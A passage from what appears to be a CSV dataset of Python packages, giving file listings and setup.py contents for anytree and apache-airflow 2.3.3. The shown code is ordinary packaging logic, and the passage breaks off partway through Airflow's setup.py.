test_special_methods_access.py test_uniquedotexporter.py test_util.py test_walker.py tox.ini,"""""""Powerful and Lightweight Python Tree Data Structure with various plugins.""""""

# To use a consistent encoding
from codecs import open
from os import path

# Always prefer setuptools over distutils
from setuptools import setup


def _read_metainfo(filepath):
    import re
    pat = re.compile(r""__(?P<name>[a-z_]+)__ = (?P<expr>.*)"")
    metainfo = {}
    with open(filepath) as fh:
        for line in fh:
            if isinstance(line, bytes):
                line = line.decode(""utf-8"")
            match = pat.match(line)
            if match:
                metainfo[match.group(""name"")] = eval(match.group(""expr""))
    return metainfo


config = _read_metainfo(""anytree/__init__.py"")
config['name'] = 'anytree'
config['license'] = 'Apache 2.0'
config['classifiers'] = [
    'Development Status :: 5 - Production/Stable',
    'Programming Language :: Python :: 2',
    'Programming Language :: Python :: 2.7',
    'Programming Language :: Python :: 3',
    'Programming Language :: Python :: 3.4',
    'Programming Language :: Python :: 3.5',
    'Programming Language :: Python :: 3.6',
    'Programming Language :: Python :: 3.7',
    'Programming Language :: Python :: 3.8',
]
config['keywords'] = 'tree, tree data, treelib, tree walk, tree structure'
config['packages'] = ['anytree', 'anytree.node', 'anytree.iterators',
                      'anytree.importer', 'anytree.exporter', 'anytree.util']
config['install_requires'] = ['six>=1.9.0']
config['extras_require'] = {
    'fastcache':  ['fastcache'],
}
config['extras_require'] = {
    'dev': ['check-manifest'],
    'test': ['coverage'],
}
config['tests_require'] = ['nose']
config['test_suite'] = 'nose.collector'
config['data_files'] = [('', ['LICENSE'])]

# Get the long description from the README file
here = path.abspath(path.dirname(__file__))
with open(path.join(here, 'README.rst'), encoding='utf-8') as f:
    config['long_description'] = f.read()

# python 2.6 does not implement OrderedDict, so we have to install it
try:
    from collections import OrderedDict  # noqa
except ImportError:
    config['install_requires'].append(""ordereddict"")

setup(**config)
",1
apache-airflow-2.3.3,0,1,1,1,1,0,0,0,alembic.ini basic_auth.py default.py deny_all.py kerberos_auth.py session.py __init__.py __init__.py api_client.py json_client.py local_client.py __init__.py delete_dag.py delete_dag.py get_code.py get_dag_runs.py get_dag_run_state.py get_lineage.py get_task.py get_task_instance.py mark_tasks.py pool.py trigger_dag.py __init__.py mark_tasks.py trigger_dag.py __init__.py __init__.py config_endpoint.py connection_endpoint.py dag_endpoint.py dag_run_endpoint.py dag_source_endpoint.py event_log_endpoint.py extra_link_endpoint.py health_endpoint.py import_error_endpoint.py log_endpoint.py plugin_endpoint.py pool_endpoint.py provider_endpoint.py request_dict.py role_and_permission_endpoint.py task_endpoint.py task_instance_endpoint.py user_endpoint.py variable_endpoint.py version_endpoint.py xcom_endpoint.py __init__.py exceptions.py v1.yaml parameters.py common_schema.py config_schema.py connection_schema.py dag_run_schema.py dag_schema.py dag_source_schema.py enum_schemas.py error_schema.py event_log_schema.py health_schema.py log_schema.py plugin_schema.py pool_schema.py provider_schema.py role_and_permission_schema.py sla_miss_schema.py task_instance_schema.py task_schema.py user_schema.py variable_schema.py version_schema.py xcom_schema.py __init__.py security.py types.py __init__.py base_callback_sink.py callback_requests.py database_callback_sink.py pipe_callback_sink.py __init__.py cli_parser.py celery_command.py cheat_sheet_command.py config_command.py connection_command.py dag_command.py dag_processor_command.py db_command.py info_command.py jobs_command.py kerberos_command.py kubernetes_command.py legacy_commands.py plugins_command.py pool_command.py provider_command.py role_command.py rotate_fernet_key_command.py scheduler_command.py standalone_command.py sync_perm_command.py task_command.py triggerer_command.py user_command.py variable_command.py version_command.py webserver_command.py __init__.py simple_table.py __init__.py functools.py sqlalchemy.py __init__.py configuration.py airflow_local_settings.py config.yml config.yml.schema.json default_airflow.cfg default_celery.py default_test.cfg default_webserver_config.py __init__.py aws_athena_hook.py aws_datasync_hook.py aws_dynamodb_hook.py aws_firehose_hook.py aws_glue_catalog_hook.py aws_hook.py aws_lambda_hook.py aws_logs_hook.py aws_sns_hook.py aws_sqs_hook.py azure_container_instance_hook.py azure_container_registry_hook.py azure_container_volume_hook.py azure_cosmos_hook.py azure_data_lake_hook.py azure_fileshare_hook.py bigquery_hook.py cassandra_hook.py cloudant_hook.py databricks_hook.py datadog_hook.py datastore_hook.py dingding_hook.py discord_webhook_hook.py emr_hook.py fs_hook.py ftp_hook.py gcp_api_base_hook.py gcp_bigtable_hook.py gcp_cloud_build_hook.py gcp_compute_hook.py gcp_container_hook.py gcp_dataflow_hook.py gcp_dataproc_hook.py gcp_dlp_hook.py gcp_function_hook.py gcp_kms_hook.py gcp_mlengine_hook.py gcp_natural_language_hook.py gcp_pubsub_hook.py gcp_spanner_hook.py gcp_speech_to_text_hook.py gcp_sql_hook.py gcp_tasks_hook.py gcp_text_to_speech_hook.py gcp_transfer_hook.py gcp_translate_hook.py gcp_video_intelligence_hook.py gcp_vision_hook.py gcs_hook.py gdrive_hook.py grpc_hook.py imap_hook.py jenkins_hook.py jira_hook.py mongo_hook.py openfaas_hook.py opsgenie_alert_hook.py pagerduty_hook.py pinot_hook.py qubole_check_hook.py qubole_hook.py redis_hook.py redshift_hook.py sagemaker_hook.py salesforce_hook.py segment_hook.py sftp_hook.py slack_webhook_hook.py snowflake_hook.py spark_jdbc_hook.py spark_sql_hook.py spark_submit_hook.py sqoop_hook.py ssh_hook.py vertica_hook.py wasb_hook.py winrm_hook.py __init__.py adls_list_operator.py adls_to_gcs.py awsbatch_operator.py aws_athena_operator.py aws_sqs_publish_operator.py azure_container_instances_operator.py azure_cosmos_operator.py bigquery_check_operator.py bigquery_get_data.py bigquery_operator.py bigquery_table_delete_operator.py bigquery_to_bigquery.py bigquery_to_gcs.py bigquery_to_mysql_operator.py cassandra_to_gcs.py databricks_operator.py dataflow_operator.py dataproc_operator.py datastore_export_operator.py datastore_import_operator.py dingding_operator.py discord_webhook_operator.py docker_swarm_operator.py druid_operator.py dynamodb_to_s3.py ecs_operator.py emr_add_steps_operator.py emr_create_job_flow_operator.py emr_terminate_job_flow_operator.py file_to_gcs.py file_to_wasb.py gcp_bigtable_operator.py gcp_cloud_build_operator.py gcp_compute_operator.py gcp_container_operator.py gcp_dlp_operator.py gcp_function_operator.py gcp_natural_language_operator.py gcp_spanner_operator.py gcp_speech_to_text_operator.py gcp_sql_operator.py gcp_tasks_operator.py gcp_text_to_speech_operator.py gcp_transfer_operator.py gcp_translate_operator.py gcp_translate_speech_operator.py gcp_video_intelligence_operator.py gcp_vision_operator.py gcs_acl_operator.py gcs_delete_operator.py gcs_download_operator.py gcs_list_operator.py gcs_operator.py gcs_to_bq.py gcs_to_gcs.py gcs_to_gcs_transfer_operator.py gcs_to_gdrive_operator.py gcs_to_s3.py grpc_operator.py hive_to_dynamodb.py imap_attachment_to_s3_operator.py jenkins_job_trigger_operator.py jira_operator.py kubernetes_pod_operator.py mlengine_operator.py mongo_to_s3.py mssql_to_gcs.py mysql_to_gcs.py opsgenie_alert_operator.py oracle_to_azure_data_lake_transfer.py oracle_to_oracle_transfer.py postgres_to_gcs_operator.py pubsub_operator.py qubole_check_operator.py qubole_operator.py redis_publish_operator.py s3_copy_object_operator.py s3_delete_objects_operator.py s3_list_operator.py s3_to_gcs_operator.py s3_to_gcs_transfer_operator.py s3_to_sftp_operator.py sagemaker_base_operator.py sagemaker_endpoint_config_operator.py sagemaker_endpoint_operator.py sagemaker_model_operator.py sagemaker_training_operator.py sagemaker_transform_operator.py sagemaker_tuning_operator.py segment_track_event_operator.py sftp_operator.py sftp_to_s3_operator.py slack_webhook_operator.py snowflake_operator.py sns_publish_operator.py spark_jdbc_operator.py spark_sql_operator.py spark_submit_operator.py sql_to_gcs.py sqoop_operator.py ssh_operator.py vertica_operator.py vertica_to_hive.py vertica_to_mysql.py wasb_delete_blob_operator.py winrm_operator.py __init__.py aws_secrets_manager.py aws_systems_manager.py azure_key_vault.py gcp_secrets_manager.py hashicorp_vault.py __init__.py aws_athena_sensor.py aws_glue_catalog_partition_sensor.py aws_redshift_cluster_sensor.py aws_sqs_sensor.py azure_cosmos_sensor.py bash_sensor.py bigquery_sensor.py cassandra_record_sensor.py cassandra_table_sensor.py celery_queue_sensor.py datadog_sensor.py emr_base_sensor.py emr_job_flow_sensor.py emr_step_sensor.py file_sensor.py ftp_sensor.py gcp_transfer_sensor.py gcs_sensor.py hdfs_sensor.py imap_attachment_sensor.py jira_sensor.py mongo_sensor.py pubsub_sensor.py python_sensor.py qubole_sensor.py redis_key_sensor.py redis_pub_sub_sensor.py sagemaker_base_sensor.py sagemaker_endpoint_sensor.py sagemaker_training_sensor.py sagemaker_transform_sensor.py sagemaker_tuning_sensor.py sftp_sensor.py wasb_sensor.py weekday_sensor.py __init__.py cgroup_task_runner.py __init__.py gcp_field_sanitizer.py gcp_field_validator.py task_handler_with_custom_formatter.py __init__.py mlengine_operator_utils.py mlengine_prediction_summary.py sendgrid.py weekday.py __init__.py __init__.py customized_form_field_behaviours.schema.json manager.py processor.py __init__.py base.py branch_python.py python.py python_virtualenv.py task_group.py __init__.py example_bash_operator.py example_branch_datetime_operator.py example_branch_day_of_week_operator.py example_branch_labels.py example_branch_operator.py example_branch_operator_decorator.py example_branch_python_dop_operator_3.py example_complex.py example_dag_decorator.py example_external_task_marker_dag.py example_kubernetes_executor.py example_latest_only.py example_latest_only_with_trigger.py example_local_kubernetes_executor.py example_nested_branch_dag.py example_passing_params_via_test_command.py example_python_operator.py example_short_circuit_operator.py example_skip_dag.py example_sla_dag.py example_subdag_operator.py example_task_group.py example_task_group_decorator.py example_time_delta_sensor_async.py example_trigger_controller_dag.py example_trigger_target_dag.py example_xcom.py example_xcomargs.py helper.py __init__.py workday.py __init__.py subdag.py __init__.py tutorial.py tutorial_etl_dag.py tutorial_taskflow_api_etl.py tutorial_taskflow_api_etl_virtualenv.py __init__.py exceptions.py base_executor.py celery_executor.py celery_kubernetes_executor.py dask_executor.py debug_executor.py executor_constants.py executor_loader.py kubernetes_executor.py local_executor.py local_kubernetes_executor.py sequential_executor.py __init__.py git_version base.py base_hook.py dbapi.py dbapi_hook.py docker_hook.py druid_hook.py filesystem.py hdfs_hook.py hive_hooks.py http_hook.py jdbc_hook.py mssql_hook.py mysql_hook.py oracle_hook.py pig_hook.py postgres_hook.py presto_hook.py S3_hook.py samba_hook.py slack_hook.py sqlite_hook.py subprocess.py webhdfs_hook.py zendesk_hook.py __init__.py backfill_job.py base_job.py local_task_job.py scheduler_job.py triggerer_job.py __init__.py k8s_model.py kubernetes_helper_functions.py kube_client.py kube_config.py pod.py pod_generator.py pod_generator_deprecated.py pod_launcher.py pod_launcher_deprecated.py pod_runtime_info_env.py secret.py volume.py volume_mount.py __init__.py backend.py entities.py __init__.py events.py listener.py spec.py __init__.py logging_config.py hive.py __init__.py db_types.py env.py utils.py 0001_1_5_0_current_schema.py 0002_1_5_0_create_is_encrypted.py 0003_1_5_0_for_compatibility.py 0004_1_5_0_more_logging_into_task_isntance.py 0005_1_5_2_job_id_indices.py 0006_1_6_0_adding_extra_to_log.py 0007_1_6_0_add_dagrun.py 0008_1_6_0_task_duration.py 0009_1_6_0_dagrun_config.py 0010_1_6_2_add_password_column_to_user.py 0011_1_6_2_dagrun_start_end.py 0012_1_7_0_add_notification_sent_column_to_sla_miss.py 0013_1_7_0_add_a_column_to_track_the_encryption_.py 0014_1_7_0_add_is_encrypted_column_to_variable_.py 0015_1_7_1_rename_user_table.py 0016_1_7_1_add_ti_state_index.py 0017_1_7_1_add_task_fails_journal_table.py 0018_1_7_1_add_dag_stats_table.py 0019_1_7_1_add_fractional_seconds_to_mysql_tables.py 0020_1_7_1_xcom_dag_task_indices.py 0021_1_7_1_add_pid_field_to_taskinstance.py 0022_1_7_1_add_dag_id_state_index_on_dag_run_table.py 0023_1_8_2_add_max_tries_column_to_task_instance.py 0024_1_8_2_make_xcom_value_column_a_large_binary.py 0025_1_8_2_add_ti_job_id_index.py 0026_1_8_2_increase_text_size_for_mysql.py 0027_1_10_0_add_time_zone_awareness.py 0028_1_10_0_add_kubernetes_resource_checkpointing.py 0029_1_10_0_add_executor_config_to_task_instance.py 0030_1_10_0_add_kubernetes_scheduler_uniqueness.py 0031_1_10_0_merge_heads.py 0032_1_10_0_fix_mysql_not_null_constraint.py 0033_1_10_0_fix_sqlite_foreign_key.py 0034_1_10_0_index_taskfail.py 0035_1_10_2_add_idx_log_dag.py 0036_1_10_2_add_index_to_taskinstance.py 0037_1_10_2_add_task_reschedule_table.py 0038_1_10_2_add_sm_dag_index.py 0039_1_10_2_add_superuser_field.py 0040_1_10_3_add_fields_to_dag.py 0041_1_10_3_add_schedule_interval_to_dag.py 0042_1_10_3_task_reschedule_fk_on_cascade_delete.py 0043_1_10_4_make_taskinstance_pool_not_nullable.py 0044_1_10_7_add_serialized_dag_table.py 0045_1_10_7_add_root_dag_id_to_dag.py 0046_1_10_5_change_datetime_to_datetime2_6_on_mssql_.py 0047_1_10_4_increase_queue_name_size_limit.py 0048_1_10_3_remove_dag_stat_table.py 0049_1_10_7_merge_heads.py 0050_1_10_7_increase_length_for_connection_password.py 0051_1_10_8_add_dagtags_table.py 0052_1_10_10_add_pool_slots_field_to_task_instance.py 0053_1_10_10_add_rendered_task_instance_fields_table.py 0054_1_10_10_add_dag_code_table.py 0055_1_10_11_add_precision_to_execution_date_in_mysql.py 0056_1_10_12_add_dag_hash_column_to_serialized_dag_.py 0057_1_10_13_add_fab_tables.py 0058_1_10_13_increase_length_of_fab_ab_view_menu_.py 0059_2_0_0_drop_user_and_chart.py 0060_2_0_0_remove_id_column_from_xcom.py 0061_2_0_0_increase_length_of_pool_name.py 0062_2_0_0_add_dagrun_run_type.py 0063_2_0_0_set_conn_type_as_non_nullable.py 0064_2_0_0_add_unique_constraint_to_conn_id.py 0065_2_0_0_update_schema_for_smart_sensor.py 0066_2_0_0_add_queued_by_job_id_to_ti.py 0067_2_0_0_add_external_executor_id_to_ti.py 0068_2_0_0_drop_kuberesourceversion_and_.py 0069_2_0_0_add_scheduling_decision_to_dagrun_and_.py 0070_2_0_0_fix_mssql_exec_date_rendered_task_instance.py 0071_2_0_0_add_job_id_to_dagrun_table.py 0072_2_0_0_add_k8s_yaml_to_rendered_templates.py 0073_2_0_0_prefix_dag_permissions.py 0074_2_0_0_resource_based_permissions.py 0075_2_0_0_add_description_field_to_connection.py 0076_2_0_0_fix_description_field_in_connection_to_.py 0077_2_0_0_change_field_in_dagcode_to_mediumtext_.py 0078_2_0_1_remove_can_read_permission_on_config_.py 0079_2_0_2_increase_size_of_connection_extra_field_.py 0080_2_0_2_change_default_pool_slots_to_1.py 0081_2_0_2_rename_last_scheduler_run_column.py 0082_2_1_0_increase_pool_name_size_in_taskinstance.py 0083_2_1_0_add_description_field_to_variable.py 0084_2_1_0_resource_based_permissions_for_default_.py 0085_2_1_3_add_queued_at_column_to_dagrun_table.py 0086_2_1_4_add_max_active_runs_column_to_dagmodel_.py 0087_2_1_4_add_index_on_state_dag_id_for_queued_.py 0088_2_2_0_improve_mssql_compatibility.py 0089_2_2_0_make_xcom_pkey_columns_non_nullable.py 0090_2_2_0_rename_concurrency_column_in_dag_table_.py 0091_2_2_0_add_trigger_table_and_task_info.py 0092_2_2_0_add_data_interval_start_end_to_dagmodel_and_dagrun.py 0093_2_2_0_taskinstance_keyed_to_dagrun.py 0094_2_2_3_add_has_import_errors_column_to_dagmodel.py 0095_2_2_4_add_session_table_to_db.py 0096_2_2_4_adding_index_for_dag_id_in_job.py 0097_2_3_0_increase_length_of_email_and_username.py 0098_2_3_0_added_timetable_description_column.py 0099_2_3_0_add_task_log_filename_template_model.py 0100_2_3_0_add_taskmap_and_map_id_on_taskinstance.py 0101_2_3_0_add_data_compressed_to_serialized_dag.py 0102_2_3_0_switch_xcom_table_to_use_run_id.py 0103_2_3_0_add_callback_request_table.py 0104_2_3_0_migrate_rtif_to_use_run_id_and_map_index.py 0105_2_3_0_add_map_index_to_taskfail.py 0106_2_3_0_update_migration_for_fab_tables_to_add_missing_constraints.py 0107_2_3_0_add_map_index_to_log.py 0108_2_3_0_default_dag_view_grid.py 0109_2_3_1_add_index_for_event_in_log.py 0110_2_3_2_add_cascade_to_dag_tag_foreignkey.py 0111_2_3_3_add_indexes_for_cascade_deletes.py __init__.py __init__.py abstractoperator.py base.py baseoperator.py connection.py crypto.py dag.py dagbag.py dagcode.py dagparam.py dagpickle.py dagrun.py db_callback_request.py errors.py log.py mappedoperator.py operator.py param.py pool.py renderedtifields.py sensorinstance.py serialized_dag.py skipmixin.py slamiss.py taskfail.py taskinstance.py tasklog.py taskmap.py taskmixin.py taskreschedule.py trigger.py variable.py xcom.py xcom_arg.py __init__.py decorators.py __init__.py __init__.py bash.py bash_operator.py branch.py branch_operator.py check_operator.py dagrun_operator.py datetime.py docker_operator.py druid_check_operator.py dummy.py dummy_operator.py email.py email_operator.py empty.py gcs_to_s3.py generic_transfer.py google_api_to_s3_transfer.py hive_operator.py hive_stats_operator.py hive_to_druid.py hive_to_mysql.py hive_to_samba_operator.py http_operator.py jdbc_operator.py latest_only.py latest_only_operator.py mssql_operator.py mssql_to_hive.py mysql_operator.py mysql_to_hive.py oracle_operator.py papermill_operator.py pig_operator.py postgres_operator.py presto_check_operator.py presto_to_mysql.py python.py python_operator.py redshift_to_s3_operator.py s3_file_transform_operator.py s3_to_hive_operator.py s3_to_redshift_operator.py slack_operator.py smooth.py sql.py sqlite_operator.py sql_branch_operator.py subdag.py subdag_operator.py trigger_dagrun.py weekday.py __init__.py plugins_manager.py providers_manager.py provider_info.schema.json base_secrets.py environment_variables.py local_filesystem.py metastore.py __init__.py kerberos.py permissions.py utils.py __init__.py base.py base_sensor_operator.py bash.py date_time.py date_time_sensor.py external_task.py external_task_sensor.py filesystem.py hdfs_sensor.py hive_partition_sensor.py http_sensor.py metastore_partition_sensor.py named_hive_partition_sensor.py python.py s3_key_sensor.py s3_prefix_sensor.py smart_sensor.py sql.py sql_sensor.py time_delta.py time_delta_sensor.py time_sensor.py web_hdfs_sensor.py weekday.py __init__.py sentry.py enums.py helpers.py json_schema.py schema.json serialized_objects.py __init__.py settings.py smart_sensor_group.py __init__.py stats.py base_task_runner.py cgroup_task_runner.py standard_task_runner.py __init__.py __init__.py templates.py base.py events.py interval.py simple.py __init__.py dependencies_deps.py dependencies_states.py base_ti_dep.py dagrun_backfill_dep.py dagrun_exists_dep.py dag_ti_slots_available_dep.py dag_unpaused_dep.py exec_date_after_start_date_dep.py mapped_task_expanded.py not_in_retry_period_dep.py not_previously_skipped_dep.py pool_slots_available_dep.py prev_dagrun_dep.py ready_to_reschedule.py runnable_exec_date_dep.py task_concurrency_dep.py task_not_running_dep.py trigger_rule_dep.py valid_state_dep.py __init__.py dep_context.py __init__.py base.py temporal.py testing.py __init__.py typing_compat.py airflow_flask_app.py cli.py cli_action_loggers.py code_utils.py compression.py configuration.py context.py context.pyi dag_cycle_tester.py dates.py db.py db_cleanup.py decorators.py docs.py dot_renderer.py edgemodifier.py email.py entry_points.py event_scheduler.py file.py helpers.py json.py jwt_signer.py cloudwatch_task_handler.py colored_log.py es_task_handler.py file_processor_handler.py file_task_handler.py gcs_task_handler.py json_formatter.py logging_mixin.py log_reader.py non_caching_file_handler.py s3_task_handler.py secrets_masker.py stackdriver_task_handler.py task_handler_with_custom_formatter.py wasb_task_handler.py __init__.py mixins.py module_loading.py net.py operator_helpers.py operator_resources.py orm_event_handlers.py platform.py process_utils.py python_virtualenv.py python_virtualenv_script.jinja2 retries.py serve_logs.py session.py sqlalchemy.py state.py strings.py task_group.py timeout.py timezone.py trigger_rule.py types.py weekday.py weight_rule.py yaml.py __init__.py version.py .babelrc .eslintignore .eslintrc .stylelintignore .stylelintrc endpoints.py __init__.py __init__.py app.py auth.py blueprints.py decorators.py init_appbuilder.py init_appbuilder_links.py init_dagbag.py init_jinja_globals.py init_manifest_files.py init_robots.py init_security.py init_session.py init_views.py init_wsgi_middlewares.py __init__.py manager.py manager.py models.py __init__.py __init__.py forms.py gunicorn_config.py jest-setup.js jest.config.js package.json security.py session.py airflow.gif bootstrap-theme.css calendar.css dags.css flash.css gantt.css graph.css grid.css loading-dots.css main.css material-icons.css switch.css airflowDefaultTheme.d3d1b0809f936a6f2b56.css airflowDefaultTheme.d3d1b0809f936a6f2b56.js bootstrap-datetimepicker.min.css bootstrap-datetimepicker.min.js bootstrap3-typeahead.min.js calendar.f5da7b189d26348eea87.css calendar.f5da7b189d26348eea87.js calendar.f5da7b189d26348eea87.js.LICENSE.txt codemirror.css codemirror.js coffeescript-lint.js connectionForm.ec3ec1657716a391da2d.js connectionForm.ec3ec1657716a391da2d.js.LICENSE.txt css-lint.js d3-shape.min.js d3-tip.js d3.min.js dag.d96f459ba381731f1b7f.js dag.d96f459ba381731f1b7f.js.LICENSE.txt dagCode.03352d4435c71024d80b.js dagCode.03352d4435c71024d80b.js.LICENSE.txt dagDependencies.b4be4366640d78278655.js dagDependencies.b4be4366640d78278655.js.LICENSE.txt dagre-d3.core.min.js dagre-d3.core.min.js.LICENSE.txt dagre-d3.core.min.js.map dagre-d3.min.js dagre-d3.min.js.LICENSE.txt dagre-d3.min.js.map dags.f7c40b546b5aa440c61d.css dags.f7c40b546b5aa440c61d.js dags.f7c40b546b5aa440c61d.js.LICENSE.txt dataTables.bootstrap.min.css dataTables.bootstrap.min.js dataTables.bootstrap.min.js.LICENSE.txt durationChart.aa827bbdd9cfba99399f.js durationChart.aa827bbdd9cfba99399f.js.LICENSE.txt flash.5adc3a4998ff394d2a3e.css flash.5adc3a4998ff394d2a3e.js gantt.55ea3ebe79acd3ab7fc8.css gantt.55ea3ebe79acd3ab7fc8.js gantt.55ea3ebe79acd3ab7fc8.js.LICENSE.txt graph.0619193301c1dcd39f52.css graph.0619193301c1dcd39f52.js graph.0619193301c1dcd39f52.js.LICENSE.txt grid.b5b8f304b97f905ad2ed.css grid.b5b8f304b97f905ad2ed.js grid.b5b8f304b97f905ad2ed.js.LICENSE.txt html-lint.js javascript-lint.js javascript.js jquery.dataTables.min.js jquery.dataTables.min.js.LICENSE.txt jshint.js jshint.js.LICENSE.txt json-lint.js lint.css lint.js loadingDots.37c7fd200eafd0c27df7.css loadingDots.37c7fd200eafd0c27df7.js main.d6649b884746315637be.css main.d6649b884746315637be.js main.d6649b884746315637be.js.LICENSE.txt manifest.json materialIcons.b5be025c4c658382069b.css materialIcons.b5be025c4c658382069b.js moment.c42e4c391a00d2899c5c.js moment.c42e4c391a00d2899c5c.js.LICENSE.txt nv.d3.min.css nv.d3.min.css.map nv.d3.min.js nv.d3.min.js.map oss-licenses.json redoc.standalone.js redoc.standalone.js.LICENSE.txt redoc.standalone.js.map sum.md5 switch.5d98f83f9b36aa989233.css switch.5d98f83f9b36aa989233.js task.2a55ee7bba7ae765b284.js task.2a55ee7bba7ae765b284.js.LICENSE.txt taskInstances.5bb0bb48e8295e355118.js taskInstances.5bb0bb48e8295e355118.js.LICENSE.txt tiLog.74059164f78498e04d63.js tiLog.74059164f78498e04d63.js.LICENSE.txt trigger.a93a374dcc4a07b5a61b.js trigger.a93a374dcc4a07b5a61b.js.LICENSE.txt variableEdit.c727e4367a386e11856c.js variableEdit.c727e4367a386e11856c.js.LICENSE.txt yaml-lint.js calendar.js connection_form.js dag.js dags.js dag_code.js dag_dependencies.js datetime_utils.js duration_chart.js gantt.js graph.js index.ts useClearRun.js useClearTask.js useConfirmMarkTask.js useExtraLinks.js useGridData.test.js useGridData.ts useMappedInstances.js useMarkFailedRun.js useMarkFailedTask.js useMarkSuccessRun.js useMarkSuccessTask.js useQueueRun.js useRunTask.js useTasks.test.jsx useTasks.ts AutoRefresh.jsx Clipboard.jsx Clipboard.test.jsx InstanceTooltip.test.tsx InstanceTooltip.tsx StatusBox.tsx Table.jsx Table.test.jsx TaskName.jsx TaskName.test.jsx Time.test.tsx Time.tsx Tooltip.tsx autorefresh.jsx containerRef.tsx timezone.jsx Bar.tsx index.test.tsx index.tsx Tooltip.jsx BreadcrumbText.tsx ConfirmDialog.jsx Dag.jsx ClearRun.jsx index.jsx MarkFailedRun.jsx MarkSuccessRun.jsx QueueRun.jsx Details.jsx ExtraLinks.jsx index.tsx Logs.jsx MappedInstances.jsx Nav.jsx ActionButton.jsx Clear.jsx MarkFailed.jsx MarkSuccess.jsx Run.jsx Header.tsx index.tsx FilterBar.jsx Grid.test.jsx Grid.tsx index.d.ts index.jsx LegendRow.test.tsx LegendRow.tsx Main.tsx README.md renderTaskRows.test.tsx renderTaskRows.tsx ResetRoot.jsx theme.ts ToggleGroups.jsx index.ts index.ts testUtils.jsx useErrorToast.js useErrorToast.test.jsx useFilters.js useFilters.test.jsx useSelection.test.tsx useSelection.ts main.js task.js task_instances.js ti_log.js trigger.js utils.js variable_edit.js loading.gif pin.svg pin_100.png pin_25.png pin_32.png pin_35.png pin_40.png pin_large.png robots.txt sort_asc.png sort_both.png sort_desc.png calendar.html chart.html code.html config.html confirm.html conn_create.html conn_edit.html dag.html dagrun_details.html dags.html dag_audit_log.html dag_code.html dag_dependencies.html dag_details.html duration_chart.html gantt.html graph.html grid.html main.html model_list.html noaccess.html not_found.html no_roles_permissions.html plugin.html providers.html redoc.html task.html task_instance.html ti_code.html ti_log.html traceback.html trigger.html variable_edit.html variable_list.html variable_show.html variable_show_widget.html xcom.html _messages.html google_analytics.html metarouter.html segment.html custom_icons.html dag_docs.html flash.html index.html loading_dots.html navbar.html navbar_menu.html navbar_right.html tsconfig.json utils.py validators.py views.py webpack.config.js widgets.py __init__.py __init__.py __init__.py __main__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE LICENSE-bootstrap.txt LICENSE-bootstrap3-typeahead.txt LICENSE-d3-shape.txt LICENSE-d3-tip.txt LICENSE-d3js.txt LICENSE-dagre-d3.txt LICENSE-datatables.txt LICENSE-elasticmock.txt LICENSE-eonasdan-bootstrap-datetimepicker.txt LICENSE-flask-kerberos.txt LICENSE-hue.txt LICENSE-jqclock.txt LICENSE-jquery.txt LICENSE-moment-strftime.txt LICENSE-moment.txt LICENSE-normalize.txt LICENSES-ui.txt MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md RELEASE_NOTES.rst airflow airflow-flower.service airflow-kerberos.service airflow-scheduler.service airflow-webserver.service airflow-worker.service airflow.conf README setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
""""""Setup.py for the Airflow project.""""""
import glob
import logging
import os
import subprocess
import sys
import unittest
from copy import deepcopy
from os.path import dirname, relpath
from textwrap import wrap
from typing import Dict, List

from setuptools import Command, Distribution, find_namespace_packages, setup
from setuptools.command.develop import develop as develop_orig
from setuptools.command.install import install as install_orig

# Setuptools patches this import to point to a vendored copy instead of the
# stdlib, which is deprecated in Python 3.10 and will be removed in 3.12.
from distutils import log  # isort: skip

# Controls whether providers are installed from packages or directly from sources
# It is turned on by default in case of development environments such as Breeze
# And it is particularly useful when you add a new provider and there is no
# PyPI version to install the provider package from
INSTALL_PROVIDERS_FROM_SOURCES = 'INSTALL_PROVIDERS_FROM_SOURCES'
PY39 = sys.version_info >= (3, 9)

logger = logging.getLogger(__name__)

version = '2.3.3'

my_dir = dirname(__file__)


def airflow_test_suite() -> unittest.TestSuite:
    """"""Test suite for Airflow tests""""""
    test_loader = unittest.TestLoader()
    test_suite = test_loader.discover(os.path.join(my_dir, 'tests'), pattern='test_*.py')
    return test_suite


class CleanCommand(Command):
    """"""
    Command to tidy up the project root.
    Registered as cmdclass in setup() so it can be called with ``python setup.py extra_clean``.
    """"""

    description = ""Tidy up the project root""
    user_options: List[str] = []

    def initialize_options(self) -> None:
        """"""Set default values for options.""""""

    def finalize_options(self) -> None:
        """"""Set final values for options.""""""

    @staticmethod
    def rm_all_files(files: List[str]) -> None:
        """"""Remove all files from the list""""""
        for file in files:
            try:
                os.remove(file)
            except Exception as e:
                logger.warning(""Error when removing %s: %s"", file, e)

    def run(self) -> None:
        """"""Remove temporary files and directories.""""""
        os.chdir(my_dir)
        self.rm_all_files(glob.glob('./build/*'))
        self.rm_all_files(glob.glob('./**/__pycache__/*', recursive=True))
        self.rm_all_files(glob.glob('./**/*.pyc', recursive=True))
        self.rm_all_files(glob.glob('./dist/*'))
        self.rm_all_files(glob.glob('./*.egg-info'))
        self.rm_all_files(glob.glob('./docker-context-files/*.whl'))
        self.rm_all_files(glob.glob('./docker-context-files/*.tgz'))


class CompileAssets(Command):
    """"""
    Compile and build the frontend assets using yarn and webpack.
    Registered as cmdclass in setup() so it can be called with ``python setup.py compile_assets``.
    """"""

    description = ""Compile and build the frontend assets""
    user_options: List[str] = []

    def initialize_options(self) -> None:
        """"""Set default values for options.""""""

    def finalize_options(self) -> None:
        """"""Set final values for options.""""""

    def run(self) -> None:
        """"""Run a command to compile and build assets.""""""
        subprocess.check_call('./airflow/www/compile_assets.sh')


class ListExtras(Command):
    """"""
    List all available extras
    Registered as cmdclass in setup() so it can be called with ``python setup.py list_extras``.
    """"""

    description = ""List available extras""
    user_options: List[str] = []

    def initialize_options(self) -> None:
        """"""Set default values for options.""""""

    def finalize_options(self) -> None:
        """"""Set final values for options.""""""

    def run(self) -> None:
        """"""List extras.""""""
        print(""\n"".join(wrap("", "".join(EXTRAS_REQUIREMENTS.keys()), 100)))


def git_version(version_: str) -> str:
    """"""
